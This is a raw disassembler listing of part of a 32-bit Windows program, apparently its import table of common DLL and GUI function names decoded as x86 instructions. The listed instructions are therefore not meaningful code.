  42856b:	add    BYTE PTR [edx+ecx*4+0x2],ch
  42856f:	add    BYTE PTR [esi-0x76],bh
  428572:	add    al,BYTE PTR [eax]
  428574:	xchg   esp,eax
  428575:	mov    al,BYTE PTR [edx]
  428577:	add    BYTE PTR [esi-0x47fffd76],ah
  42857d:	mov    al,BYTE PTR [edx]
  42857f:	add    al,cl
  428581:	mov    al,BYTE PTR [edx]
  428583:	add    dh,ah
  428585:	mov    al,BYTE PTR [edx]
  428587:	add    dh,dh
  428589:	mov    al,BYTE PTR [edx]
  42858b:	add    BYTE PTR [ebx+ecx*4],al
  42858e:	add    al,BYTE PTR [eax]
  428590:	adc    al,0x8b
  428592:	add    al,BYTE PTR [eax]
  428594:	and    cl,BYTE PTR [ebx-0x74cdfffe]
  42859a:	add    al,BYTE PTR [eax]
  42859c:	mov    eax,DWORD PTR ds:[edx]
  42859f:	add    BYTE PTR [eax-0x75],dl
  4285a2:	add    al,BYTE PTR [eax]
  4285a4:	bound  ecx,QWORD PTR [ebx-0x7487fffe]
  4285aa:	add    al,BYTE PTR [eax]
  4285ac:	xchg   BYTE PTR [ebx-0x746dfffe],cl
  4285b2:	add    al,BYTE PTR [eax]
  4285b4:	lods   al,BYTE PTR ds:[esi]
  4285b5:	mov    eax,DWORD PTR [edx]
  4285b7:	add    ah,al
  4285b9:	mov    eax,DWORD PTR [edx]
  4285bb:	add    ah,bl
  4285bd:	mov    eax,DWORD PTR [edx]
  4285bf:	add    dl,ch
  4285c1:	mov    eax,DWORD PTR [edx]
  4285c3:	add    dh,dh
  4285c5:	mov    eax,DWORD PTR [edx]
  4285c7:	add    BYTE PTR [eax],cl
  4285c9:	mov    WORD PTR [edx],es
  4285cb:	add    BYTE PTR [eax],al
  4285cd:	add    BYTE PTR [eax],al
  4285cf:	add    BYTE PTR [eax],ch
  4285d1:	mov    WORD PTR [edx],es
  4285d3:	add    BYTE PTR [edx],dh
  4285d5:	mov    WORD PTR [edx],es
  4285d7:	add    BYTE PTR [eax-0x74],al
  4285da:	add    al,BYTE PTR [eax]
  4285dc:	dec    esp
  4285dd:	mov    WORD PTR [edx],es
  4285df:	add    BYTE PTR [esp+ecx*4+0x2],bl
  4285e3:	add    BYTE PTR [edx-0x74],ch
  4285e6:	add    al,BYTE PTR [eax]
  4285e8:	jbe    0x428576
  4285ea:	add    al,BYTE PTR [eax]
  4285ec:	or     BYTE PTR [edx+eax*1+0x28c9200],0x0
  4285f4:	test   al,0x8c
  4285f6:	add    al,BYTE PTR [eax]
  4285f8:	mov    esi,0xd400028c
  4285fd:	mov    WORD PTR [edx],es
  4285ff:	add    ah,ah
  428601:	mov    WORD PTR [edx],es
  428603:	add    ah,dh
  428605:	mov    WORD PTR [edx],es
  428607:	add    BYTE PTR [ecx*4-0x72edfffe],al
  42860e:	add    al,BYTE PTR [eax]
  428610:	sub    cl,BYTE PTR [ebp-0x72cbfffe]
  428616:	add    al,BYTE PTR [eax]
  428618:	inc    eax
  428619:	lea    eax,[edx]
  42861b:	add    BYTE PTR [esi-0x73],cl
  42861e:	add    al,BYTE PTR [eax]
	...
  428630:	arpl   WORD PTR [ebp+0x64],bp
  428633:	cs gs js 0x42869c
  428637:	add    BYTE PTR [edi],dl
  428639:	add    BYTE PTR [ebp+eiz*2+0x73],al
  42863d:	je     0x4286b1
  42863f:	outs   dx,DWORD PTR ds:[esi]
  428640:	jns    0x428692
  428642:	jb     0x4286b3
  428644:	jo     0x4286ab
  428646:	jb     0x4286bc
  428648:	jns    0x42869d
  42864a:	push   0x50746565
  42864f:	popa   
  428650:	add    BYTE PTR gs:[bx+si],al
  428654:	pop    esp
  428655:	add    BYTE PTR [eax+0x72],dl
  428658:	outs   dx,DWORD PTR ds:[esi]
  428659:	jo     0x4286c0
  42865b:	jb     0x4286d1
  42865d:	jns    0x4286b2
  42865f:	push   0x57746565
  428664:	add    BYTE PTR [eax],al
  428666:	pop    ebx
  428667:	add    BYTE PTR [eax+0x72],dl
  42866a:	outs   dx,DWORD PTR ds:[esi]
  42866b:	jo     0x4286d2
  42866d:	jb     0x4286e3
  42866f:	jns    0x4286c4
  428671:	push   0x41746565
  428676:	add    BYTE PTR [eax],al
  428678:	dec    esi
  428679:	add    BYTE PTR [ecx+0x6d],cl
  42867c:	popa   
  42867d:	addr16 gs dec esp
  428680:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  428687:	ins    BYTE PTR es:[edi],dx
  428688:	popa   
  428689:	arpl   WORD PTR [ebp+0x49],sp
  42868c:	arpl   WORD PTR [edi+0x6e],bp
  42868f:	add    BYTE PTR [ecx],dh
  428691:	add    BYTE PTR [ecx+0x6d],cl
  428694:	popa   
  428695:	addr16 gs dec esp
  428698:	imul   esi,DWORD PTR [ebx+0x74],0x7365445f
  42869f:	je     0x428713
  4286a1:	outs   dx,DWORD PTR ds:[esi]
  4286a2:	jns    0x4286a4
  4286a4:	inc    eax
  4286a5:	add    BYTE PTR [ecx+0x6d],cl
  4286a8:	popa   
  4286a9:	addr16 gs dec esp
  4286ac:	imul   esi,DWORD PTR [ebx+0x74],0x7465475f
  4286b3:	dec    ecx
  4286b4:	ins    DWORD PTR es:[edi],dx
  4286b5:	popa   
  4286b6:	addr16 gs inc ebx
  4286b9:	outs   dx,DWORD PTR ds:[esi]
  4286ba:	jne    0x42872a
  4286bc:	je     0x4286be
  4286be:	dec    esp
  4286bf:	add    BYTE PTR [ecx+0x6d],cl
  4286c2:	popa   
  4286c3:	addr16 gs dec esp
  4286c6:	imul   esi,DWORD PTR [ebx+0x74],0x6d65525f
  4286cd:	outs   dx,DWORD PTR ds:[esi]
  4286ce:	jbe    0x428735
  4286d0:	add    BYTE PTR [eax],al
  4286d2:	inc    ebx
  4286d3:	dec    edi
  4286d4:	dec    ebp
  4286d5:	inc    ebx
  4286d6:	push   esp
  4286d7:	dec    esp
  4286d8:	xor    esi,DWORD PTR [edx]
  4286da:	cs fs ins BYTE PTR es:[edi],dx
  4286dd:	ins    BYTE PTR es:[edi],dx
  4286de:	add    BYTE PTR [eax],al
  4286e0:	push   edi
  4286e1:	add    BYTE PTR [ebx+0x72],al
  4286e4:	gs popa 
  4286e6:	je     0x42874d
  4286e8:	inc    esp
  4286e9:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  4286f0:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  4286f8:	jb     0x42875b
  4286fa:	ins    DWORD PTR es:[edi],dx
  4286fb:	push   edi
  4286fc:	add    BYTE PTR [eax],al
  4286fe:	xor    al,BYTE PTR [edx]
  428700:	push   ebx
  428701:	gs je  0x428747
  428704:	popa   
  428705:	jb     0x42876c
  428707:	je     0x428759
  428709:	outs   dx,DWORD PTR ds:[esi]
  42870a:	jae    0x42870c
  42870c:	cmp    al,BYTE PTR [ecx]
  42870e:	inc    edi
  42870f:	gs je  0x42875f
  428712:	gs jae 0x428788
  428715:	popa   
  428716:	addr16 gs inc ecx
  428719:	add    BYTE PTR [edx+0x61724400],dh
  42871f:	ja     0x428767
  428721:	jb     0x428784
  428723:	ins    DWORD PTR es:[edi],dx
  428724:	gs inc ebx
  428726:	outs   dx,DWORD PTR ds:[esi]
  428727:	outs   dx,BYTE PTR ds:[esi]
  428728:	je     0x42879c
  42872a:	outs   dx,DWORD PTR ds:[esi]
  42872b:	ins    BYTE PTR es:[edi],dx
  42872c:	add    BYTE PTR [eax],al
  42872e:	sbb    BYTE PTR [ecx],al
  428730:	inc    edi
  428731:	gs je  0x42877d
  428734:	arpl   WORD PTR [edi+0x6e],bp
  428737:	dec    ecx
  428738:	outs   dx,BYTE PTR ds:[esi]
  428739:	outs   dx,WORD PTR ds:[esi]
  42873b:	add    bl,bh
  42873d:	add    dl,BYTE PTR [edx+esi*2+0x61]
  428741:	arpl   WORD PTR [ebx+0x50],bp
  428744:	outs   dx,DWORD PTR ds:[esi]
  428745:	jo     0x4287bc
  428747:	jo     0x428796
  428749:	outs   dx,BYTE PTR gs:[esi]
  42874b:	jne    0x42874d
  42874d:	add    cl,bl
  42874f:	add    DWORD PTR [ebp+0x6f],ecx
  428752:	outs   dx,BYTE PTR ds:[esi]
  428753:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6d6f7246
  42875b:	push   edx
  42875c:	arpl   WORD PTR gs:[eax+eax*1+0x39],si
  428761:	add    BYTE PTR [ebx+0x68],al
  428764:	popa   
  428765:	jb     0x4287bc
  428767:	jo     0x4287d9
  428769:	gs jb  0x4287c3
  42876c:	add    BYTE PTR [eax],al
  42876e:	add    dl,BYTE PTR ds:[ebx+0x65]
  428772:	je     0x4287b8
  428774:	ins    BYTE PTR es:[edi],dx
  428775:	addr16 dec ecx
  428777:	je     0x4287de
  428779:	ins    DWORD PTR es:[edi],dx
  42877a:	push   esp
  42877b:	gs js  0x4287f2
  42877e:	inc    ecx
  42877f:	add    BYTE PTR [edx+eax*1+0x53],bh
  428783:	push   0x774f776f
  428788:	outs   dx,BYTE PTR ds:[esi]
  428789:	gs fs push eax
  42878c:	outs   dx,DWORD PTR ds:[esi]
  42878d:	jo     0x428804
  42878f:	jo     0x428804
  428791:	add    BYTE PTR [eax],bl
  428793:	add    dl,BYTE PTR [edx+0x65]
  428796:	ins    DWORD PTR es:[edi],dx
  428797:	outs   dx,DWORD PTR ds:[esi]
  428798:	jbe    0x4287ff
  42879a:	push   eax
  42879b:	jb     0x42880c
  42879d:	jo     0x4287f6
  42879f:	add    BYTE PTR [edi+0x2],bh
  4287a2:	push   ebx
  4287a3:	push   0x6957776f
  4287a8:	outs   dx,BYTE PTR ds:[esi]
  4287a9:	outs   dx,DWORD PTR fs:[esi]
  4287ab:	ja     0x4287ad
  4287ad:	add    BYTE PTR [ebx],bl
  4287af:	add    BYTE PTR [ebx+0x61],al
  4287b2:	ins    BYTE PTR es:[edi],dx
  4287b3:	ins    BYTE PTR es:[edi],dx
  4287b4:	push   edi
  4287b5:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  4287bc:	outs   dx,DWORD PTR ds:[esi]
  4287bd:	arpl   WORD PTR [edi+0x0],dx
  4287c0:	mov    dh,0x1
  4287c2:	dec    esp
  4287c3:	outs   dx,DWORD PTR ds:[esi]
  4287c4:	popa   
  4287c5:	fs dec ebp
  4287c7:	outs   dx,BYTE PTR gs:[esi]
  4287c9:	jne    0x42880c
  4287cb:	add    BYTE PTR [edx+eax*1+0x74697753],al
  4287d2:	arpl   WORD PTR [eax+0x54],bp
  4287d5:	outs   dx,DWORD PTR ds:[esi]
  4287d6:	push   esp
  4287d7:	push   0x69577369
  4287dc:	outs   dx,BYTE PTR ds:[esi]
  4287dd:	outs   dx,DWORD PTR fs:[esi]
  4287df:	ja     0x4287e1
  4287e1:	add    BYTE PTR [eax],ah
  4287e3:	add    dl,BYTE PTR [ebx+0x63]
  4287e6:	jb     0x428857
  4287e8:	ins    BYTE PTR es:[edi],dx
  4287e9:	ins    BYTE PTR es:[edi],dx
  4287ea:	push   edi
  4287eb:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  4287f2:	add    BYTE PTR [eax],al
  4287f4:	pop    DWORD PTR [eax]
  4287f6:	inc    esp
  4287f7:	gs push di
  4287fa:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  428801:	outs   dx,DWORD PTR ds:[esi]
  428802:	arpl   WORD PTR [edi+0x0],dx
  428805:	add    BYTE PTR [ecx],dh
  428807:	add    BYTE PTR [ebx+0x68],al
  42880a:	popa   
  42880b:	jb     0x42885d
  42880d:	jb     0x428874
  42880f:	jbe    0x428868
  428811:	add    BYTE PTR [edx+eax*1+0x696c6156],ch
  428818:	fs popa 
  42881a:	je     0x428881
  42881c:	push   edx
  42881d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  428822:	xor    eax,DWORD PTR [ecx]
  428824:	inc    edi
  428825:	gs je  0x428875
  428828:	outs   dx,BYTE PTR gs:[esi]
  42882a:	jne    0x428875
  42882c:	je     0x428893
  42882e:	ins    DWORD PTR es:[edi],dx
  42882f:	dec    ecx
  428830:	inc    esp
  428831:	add    BYTE PTR ds:0x6e655302,ch
  428837:	fs dec esi
  428839:	outs   dx,DWORD PTR ds:[esi]
  42883a:	je     0x4288a5
  42883c:	data16 jns 0x42888c
  42883f:	gs jae 0x4288b5
  428842:	popa   
  428843:	addr16 gs push edi
  428846:	add    BYTE PTR [eax],al
  428848:	mov    al,0x1
  42884a:	dec    esp
  42884b:	outs   dx,DWORD PTR ds:[esi]
  42884c:	popa   
  42884d:	fs dec ecx
  42884f:	arpl   WORD PTR [edi+0x6e],bp
  428852:	push   edi
  428853:	add    BYTE PTR [ecx+0x57734901],ah
  428859:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  428860:	popa   
  428861:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  428865:	add    BYTE PTR ds:0x74654701,dl
  42886b:	inc    esi
  42886c:	outs   dx,DWORD PTR ds:[esi]
  42886d:	jb     0x4288d4
  42886f:	addr16 jb 0x4288e1
  428872:	jne    0x4288e2
  428874:	fs push edi
  428876:	imul   ebp,DWORD PTR [esi+0x64],0x7500776f
  42887d:	add    DWORD PTR [edi+0x65],eax
  428880:	je     0x4288d9
  428882:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  428889:	js     0x4288ff
  42888b:	inc    ecx
  42888c:	add    BYTE PTR [eax],al
  42888e:	add    DWORD PTR ds:[edi+0x65],eax
  428892:	je     0x4288e1
  428894:	gs jae 0x42890a
  428897:	popa   
  428898:	addr16 gs push edi
  42889b:	add    BYTE PTR [ebx],ch
  42889d:	add    dl,BYTE PTR [ebx+0x65]
  4288a0:	outs   dx,BYTE PTR ds:[esi]
  4288a1:	fs dec ebp
  4288a3:	gs jae 0x428919
  4288a6:	popa   
  4288a7:	addr16 gs push edi
  4288aa:	add    BYTE PTR [eax],al
  4288ac:	das    
  4288ad:	add    dl,BYTE PTR [ebx+0x65]
  4288b0:	je     0x4288f3
  4288b2:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  4288b6:	gs push edi
  4288b8:	imul   ebp,DWORD PTR [esi+0x64],0x400776f
  4288bf:	add    dl,BYTE PTR [edx+0x65]
  4288c2:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  4288ca:	popa   
  4288cb:	jae    0x428940
  4288cd:	inc    ebp
  4288ce:	js     0x428927
  4288d0:	add    BYTE PTR [eax],al
  4288d2:	and    DWORD PTR [edx],eax
  4288d4:	push   ebx
  4288d5:	outs   dx,BYTE PTR gs:[esi]
  4288d7:	fs inc esp
  4288d9:	ins    BYTE PTR es:[edi],dx
  4288da:	addr16 dec ecx
  4288dc:	je     0x428943
  4288de:	ins    DWORD PTR es:[edi],dx
  4288df:	dec    ebp
  4288e0:	gs jae 0x428956
  4288e3:	popa   
  4288e4:	addr16 gs inc ecx
  4288e7:	add    BYTE PTR ds:0x74654701,bh
  4288ed:	dec    ebp
  4288ee:	gs jae 0x428964
  4288f1:	popa   
  4288f2:	addr16 gs push esp
  4288f5:	imul   ebp,DWORD PTR [ebp+0x65],0x1d0000
  4288fc:	inc    ebx
  4288fd:	popa   
  4288fe:	jae    0x428963
  428900:	popa   
  428901:	fs gs push edi
  428904:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  42890b:	add    bh,bl
  42890d:	add    BYTE PTR [ebp+0x78],al
  428910:	imul   esi,DWORD PTR [edi+edx*2+0x69],0x776f646e
  428918:	jae    0x42895f
  42891a:	js     0x42891c
  42891c:	repnz add DWORD PTR [eax+0x6f],edx
  428920:	jae    0x428996
  428922:	dec    ebp
  428923:	gs jae 0x428999
  428926:	popa   
  428927:	addr16 gs push edi
  42892a:	add    BYTE PTR [eax],al
  42892c:	add    DWORD PTR fs:[edi+0x65],eax
  428930:	je     0x428987
  428932:	jo     0x428998
  428934:	popa   
  428935:	je     0x42899c
  428937:	push   edx
  428938:	outs   dx,BYTE PTR ds:[si]
  42893a:	add    BYTE PTR [eax],al
  42893c:	mov    BYTE PTR [edx],al
  42893e:	push   esp
  42893f:	popa   
  428940:	bound  esp,QWORD PTR [edx+0x65]
  428943:	fs push esp
  428945:	gs js  0x4289bc
  428948:	dec    edi
  428949:	jne    0x4289bf
  42894b:	push   edi
  42894c:	add    BYTE PTR [eax],al
  42894e:	test   eax,0x616f4c01
  428953:	fs inc edx
  428955:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xb8004170
  42895d:	add    BYTE PTR [edx+esi*2+0x61],al
  428961:	ja     0x4289b6
  428963:	je     0x4289c6
  428965:	je     0x4289cc
  428967:	push   edi
  428968:	add    BYTE PTR [eax],al
  42896a:	ja     0x42896d
  42896c:	inc    edi
  42896d:	gs je  0x4289c7
  428970:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  428977:	js     0x4289ed
  428979:	dec    esp
  42897a:	outs   dx,BYTE PTR gs:[esi]
  42897c:	addr16 je 0x4289e7
  42897f:	push   edi
  428980:	add    BYTE PTR [eax],al
  428982:	cmp    BYTE PTR [eax],al
  428984:	inc    ebx
  428985:	push   0x70557261
  42898a:	jo     0x4289f1
  42898c:	jb     0x4289d0
  42898e:	jne    0x4289f6
  428990:	push   di
  428992:	add    BYTE PTR [eax],al
  428994:	daa    
  428995:	add    DWORD PTR [edi+0x65],eax
  428998:	je     0x4289e5
  42899a:	gs jns 0x4289ff
  42899d:	outs   dx,DWORD PTR ds:[esi]
  42899e:	popa   
  42899f:	jb     0x428a05
  4289a1:	push   esp
  4289a2:	jns    0x428a14
  4289a4:	add    BYTE PTR gs:[ebx+0x1],cl
  4289a8:	inc    edi
  4289a9:	gs je  0x4289fc
  4289ac:	jb     0x428a1d
  4289ae:	jo     0x428a07
  4289b0:	add    BYTE PTR [eax],al
  4289b2:	dec    ebp
  4289b3:	add    BYTE PTR [ebx+0x6f],al
  4289b6:	jo     0x428a31
  4289b8:	push   edx
  4289b9:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  4289be:	sub    eax,0x61684300
  4289c3:	jb     0x428a13
  4289c5:	gs js  0x428a3c
  4289c8:	push   edi
  4289c9:	add    BYTE PTR [eax+0x43734901],dl
  4289cf:	push   0x6f4c7261
  4289d4:	ja     0x428a3b
  4289d6:	jb     0x428a19
  4289d8:	add    BYTE PTR [eax],al
  4289da:	sub    BYTE PTR [ecx],al
  4289dc:	inc    edi
  4289dd:	gs je  0x428a2c
  4289e0:	popa   
  4289e1:	jae    0x428a57
  4289e3:	inc    ecx
  4289e4:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  4289e8:	gs push eax
  4289ea:	outs   dx,DWORD PTR ds:[esi]
  4289eb:	jo     0x428a62
  4289ed:	jo     0x4289ef
  4289ef:	add    BYTE PTR [ebx+0x616f4c01],bh
  4289f5:	fs push ebx
  4289f7:	je     0x428a6b
  4289f9:	imul   ebp,DWORD PTR [esi+0x67],0x16d0041
  428a00:	inc    edi
  428a01:	gs je  0x428a5b
  428a04:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  428a0b:	outs   dx,BYTE PTR ds:[esi]
  428a0c:	addr16 push edi
  428a0e:	add    BYTE PTR [eax],al
  428a10:	leave  
  428a11:	add    DWORD PTR [ebp+0x61],ecx
  428a14:	jo     0x428a6d
  428a16:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  428a1d:	imul   ebp,DWORD PTR [esi+0x74],0x350073
  428a24:	inc    ebx
  428a25:	push   0x6f547261
  428a2a:	dec    edi
  428a2b:	gs ins DWORD PTR es:[edi],dx
  428a2d:	push   edi
  428a2e:	add    BYTE PTR [eax],al
  428a30:	push   ebp
  428a31:	push   ebx
  428a32:	inc    ebp
  428a33:	push   edx
  428a34:	xor    esi,DWORD PTR [edx]
  428a36:	cs fs ins BYTE PTR es:[edi],dx
  428a39:	ins    BYTE PTR es:[edi],dx
  428a3a:	add    BYTE PTR [eax],al
  428a3c:	xchg   edx,eax
  428a3d:	add    edx,DWORD PTR [edx+0x74]
  428a40:	ins    BYTE PTR es:[edi],dx
  428a41:	dec    ecx
  428a42:	outs   dx,BYTE PTR ds:[esi]
  428a43:	imul   esi,DWORD PTR [ecx+eax*2+0x6e],0x74536973
  428a4b:	jb     0x428ab6
  428a4d:	outs   dx,BYTE PTR ds:[esi]
  428a4e:	add    BYTE PTR [bp+0x74],ch
  428a52:	fs ins BYTE PTR es:[edi],dx
  428a54:	ins    BYTE PTR es:[edi],dx
  428a55:	cs fs ins BYTE PTR es:[edi],dx
  428a58:	ins    BYTE PTR es:[edi],dx
  428a59:	add    BYTE PTR ds:0x74654702,al
  428a5f:	dec    esp
  428a60:	outs   dx,DWORD PTR ds:[esi]
  428a61:	arpl   WORD PTR [ecx+0x6c],sp
  428a64:	gs dec ecx
  428a66:	outs   dx,BYTE PTR ds:[esi]
  428a67:	outs   dx,WORD PTR ds:[esi]
  428a69:	push   edi
  428a6a:	add    BYTE PTR [eax],al
  428a6c:	inc    ebp
  428a6d:	add    al,BYTE PTR [edi+0x65]
  428a70:	je     0x428ac2
  428a72:	jb     0x428ae3
  428a74:	arpl   WORD PTR [ecx+0x64],ax
  428a77:	fs jb  0x428adf
  428a7a:	jae    0x428aef
  428a7c:	add    BYTE PTR [eax],al
  428a7e:	rol    DWORD PTR [eax],cl
  428a80:	inc    ebx
  428a81:	jb     0x428ae8
  428a83:	popa   
  428a84:	je     0x428aeb
  428a86:	inc    esi
  428a87:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  428a8f:	outs   dx,BYTE PTR ds:[esi]
  428a90:	addr16 push edi
  428a92:	add    BYTE PTR [eax],al
  428a94:	sub    BYTE PTR [ebx+edx*2],al
  428a97:	gs je  0x428ae2
  428a9a:	popa   
  428a9b:	outs   dx,BYTE PTR ds:[esi]
  428a9c:	fs ins BYTE PTR es:[edi],dx
  428a9e:	gs inc ebx
  428aa0:	outs   dx,DWORD PTR ds:[esi]
  428aa1:	jne    0x428b11
  428aa3:	je     0x428aa5
  428aa5:	add    ah,bl
  428aa7:	add    BYTE PTR [ebx+0x72],al
  428aaa:	gs popa 
  428aac:	je     0x428b13
  428aae:	dec    ebp
  428aaf:	popa   
  428ab0:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x57746f
  428ab8:	pop    DWORD PTR [ecx]
  428aba:	inc    edi
  428abb:	gs je  0x428aff
  428abe:	je     0x428b2f
  428ac0:	ins    DWORD PTR es:[edi],dx
  428ac1:	dec    esi
  428ac2:	popa   
  428ac3:	ins    DWORD PTR es:[edi],dx
  428ac4:	gs inc ecx
  428ac6:	add    BYTE PTR [eax],al
  428ac8:	pusha  
  428ac9:	add    al,BYTE PTR [edi+0x65]
  428acc:	je     0x428b21
  428ace:	jns    0x428b43
  428ad0:	je     0x428b37
  428ad2:	ins    DWORD PTR es:[edi],dx
  428ad3:	push   edi
  428ad4:	imul   ebp,DWORD PTR [esi+0x64],0x4473776f
  428adb:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  428ae2:	jns    0x428b25
  428ae4:	add    BYTE PTR [eax],al
  428ae6:	aas    
  428ae7:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  428aeb:	fs dec esp
  428aed:	imul   esp,DWORD PTR [edx+0x72],0x57797261
  428af4:	add    BYTE PTR [eax],al
  428af6:	xchg   ecx,eax
  428af7:	add    al,BYTE PTR [edi+0x6c]
  428afa:	outs   dx,DWORD PTR ds:[esi]
  428afb:	bound  esp,QWORD PTR [ecx+0x6c]
  428afe:	inc    ecx
  428aff:	ins    BYTE PTR es:[edi],dx
  428b00:	ins    BYTE PTR es:[edi],dx
  428b01:	outs   dx,DWORD PTR ds:[esi]
  428b02:	arpl   WORD PTR [eax],ax
  428b04:	xchg   edx,eax
  428b05:	add    al,0x56
  428b07:	imul   esi,DWORD PTR [edx+0x74],0x516c6175
  428b0e:	jne    0x428b75
  428b10:	jb     0x428b8b
  428b12:	add    BYTE PTR [eax],al
  428b14:	test   DWORD PTR [ecx],0x46746547
  428b1a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x657079
  428b22:	jb     0x428b25
  428b24:	inc    esi
  428b25:	imul   ebp,DWORD PTR [esi+0x64],0x6f736552
  428b2c:	jne    0x428ba0
  428b2e:	arpl   WORD PTR [ebp+0x57],sp
  428b31:	add    BYTE PTR [eax],bh
  428b33:	add    ecx,DWORD PTR [ebp+0x6f]
  428b36:	jbe    0x428b9d
  428b38:	inc    esi
  428b39:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x52037600
  428b41:	popa   
  428b42:	imul   esi,DWORD PTR [ebx+0x65],0x65637845
  428b49:	jo     0x428bbf
  428b4b:	imul   ebp,DWORD PTR [edi+0x6e],0x1920000
  428b52:	inc    edi
  428b53:	gs je  0x428b98
  428b56:	imul   ebp,DWORD PTR [esi+0x61],0x79547972
  428b5d:	jo     0x428bc4
  428b5f:	inc    ecx
  428b60:	add    BYTE PTR [eax],al
  428b62:	and    DWORD PTR [ebx+edx*2],eax
  428b65:	gs je  0x428bae
  428b68:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  428b70:	bound  esi,QWORD PTR [ebp+0x74]
  428b73:	gs jae 0x428bb7
  428b76:	add    BYTE PTR [eax],al
  428b78:	add    ecx,DWORD PTR ss:[ebp+0x6f]
  428b7c:	jbe    0x428be3
  428b7e:	inc    esi
  428b7f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0xbf004178
  428b87:	add    BYTE PTR [ebx+0x6f],al
  428b8a:	jo     0x428c05
  428b8c:	inc    esi
  428b8d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x51037100
  428b95:	jne    0x428bfc
  428b97:	jb     0x428c12
  428b99:	push   eax
  428b9a:	gs jb  0x428c03
  428b9d:	outs   dx,DWORD PTR ds:[esi]
  428b9e:	jb     0x428c0d
  428ba0:	popa   
  428ba1:	outs   dx,BYTE PTR ds:[esi]
  428ba2:	arpl   WORD PTR [ebp+0x43],sp
  428ba5:	outs   dx,DWORD PTR ds:[esi]
  428ba6:	jne    0x428c16
  428ba8:	je     0x428c0f
  428baa:	jb     0x428bac
  428bac:	sub    DWORD PTR [ebx+edx*2],eax
  428baf:	gs je  0x428bfa
  428bb2:	popa   
  428bb3:	outs   dx,BYTE PTR ds:[esi]
  428bb4:	fs ins BYTE PTR es:[edi],dx
  428bb6:	gs dec ecx
  428bb8:	outs   dx,BYTE PTR ds:[esi]
  428bb9:	outs   dx,WORD PTR ds:[esi]
  428bbb:	jb     0x428c2a
  428bbd:	popa   
  428bbe:	je     0x428c29
  428bc0:	outs   dx,DWORD PTR ds:[esi]
  428bc1:	outs   dx,BYTE PTR ds:[esi]
  428bc2:	add    BYTE PTR [eax],al
  428bc4:	push   ss
  428bc5:	add    DWORD PTR [ebp+0x6e],eax
  428bc8:	je     0x428c2f
  428bca:	jb     0x428c0f
  428bcc:	jb     0x428c37
  428bce:	je     0x428c39
  428bd0:	arpl   WORD PTR [ecx+0x6c],sp
  428bd3:	push   ebx
  428bd4:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  428bd9:	outs   dx,BYTE PTR ds:[esi]
  428bda:	add    BYTE PTR [eax],al
  428bdc:	jg     0x428bdf
  428bde:	inc    esi
  428bdf:	outs   dx,DWORD PTR ds:[esi]
  428be0:	ins    BYTE PTR es:[edi],dx
  428be1:	fs push ebx
  428be3:	je     0x428c57
  428be5:	imul   ebp,DWORD PTR [esi+0x67],0x4dd0057
  428bec:	ins    BYTE PTR es:[edi],dx
  428bed:	jae    0x428c63
  428bef:	jb     0x428c5d
  428bf1:	outs   dx,BYTE PTR gs:[esi]
  428bf3:	inc    ecx
  428bf4:	add    BYTE PTR [eax],al
  428bf6:	sahf   
  428bf7:	add    DWORD PTR [edi+0x65],eax
  428bfa:	je     0x428c3f
  428bfc:	outs   dx,DWORD PTR ds:[esi]
  428bfd:	ins    DWORD PTR es:[edi],dx
  428bfe:	ins    DWORD PTR es:[edi],dx
  428bff:	push   esp
  428c00:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  428c07:	add    BYTE PTR [edx+eax*1+0x47],dh
  428c0b:	gs je  0x428c62
  428c0e:	push   0x64616572
  428c13:	push   esp
  428c14:	imul   ebp,DWORD PTR [ebp+0x65],0x4b000073
  428c1b:	inc    ebp
  428c1c:	push   edx
  428c1d:	dec    esi
  428c1e:	inc    ebp
  428c1f:	dec    esp
  428c20:	xor    esi,DWORD PTR [edx]
  428c22:	cs fs ins BYTE PTR es:[edi],dx
  428c25:	ins    BYTE PTR es:[edi],dx
  428c26:	add    BYTE PTR [eax],al
  428c28:	mov    dh,0x1
  428c2a:	push   eax
  428c2b:	outs   dx,DWORD PTR ds:[esi]
  428c2c:	ins    BYTE PTR es:[edi],dx
  428c2d:	jns    0x428c96
  428c2f:	outs   dx,DWORD PTR ds:[esi]
  428c30:	outs   dx,BYTE PTR ds:[esi]
  428c31:	add    BYTE PTR [ecx+eax*1+0x47],ch
  428c35:	gs je  0x428c87
  428c38:	bound  ebp,QWORD PTR [edx+0x65]
  428c3b:	arpl   WORD PTR [edi+edx*2+0x0],si
  428c3f:	add    BYTE PTR [ebx+0x6c654400],dh
  428c45:	gs je  0x428cad
  428c48:	inc    esp
  428c49:	inc    ebx
  428c4a:	add    BYTE PTR [eax],al
  428c4c:	rol    DWORD PTR [ecx],1
  428c4e:	push   ebx
  428c4f:	gs ins BYTE PTR es:[edi],dx
  428c51:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  428c56:	push   0x65
  428c58:	arpl   WORD PTR [eax+eax*1+0x0],si
  428c5c:	jmp    0x428c5f
  428c5e:	push   ebx
  428c5f:	gs je  0x428caf
